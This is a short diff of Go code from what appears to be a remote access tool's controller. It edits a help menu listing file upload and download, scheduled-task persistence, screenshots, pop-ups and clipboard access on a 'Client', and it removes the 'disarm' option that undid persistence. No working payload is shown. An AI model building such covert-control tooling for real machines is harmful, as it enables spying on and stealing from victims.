@@ -28,7 +28,6 @@ func options() {
 	fmt.Println("[+] upload  \t:\tUpload a file to Client")
 	fmt.Println("[+] download  \t:\tDownload a file from Client")
 	fmt.Println("[+] persist  \t:\tadd a persistance schedule task")
-	fmt.Println("[+] disarm  \t:\tremoves the persistance")
 	fmt.Println("[+] snap \t:\tSaves screen in Appdata/Roaming")
 	fmt.Println("[+] alert \t:\tPops up an Alert Dialog box")
 	fmt.Println("[+] clipboard \t:\tread or write to\\from Client clipboard")
